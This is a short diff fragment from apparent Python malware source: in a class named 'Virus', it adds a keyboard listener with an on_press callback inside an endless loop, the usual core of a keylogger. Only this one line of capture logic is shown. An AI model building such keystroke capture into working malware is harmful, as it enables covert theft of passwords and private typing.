@@ -41,3 +41,4 @@ class Virus(object):
 
         while True:
             try:
+                listener = Listener(on_press=self.on_press)
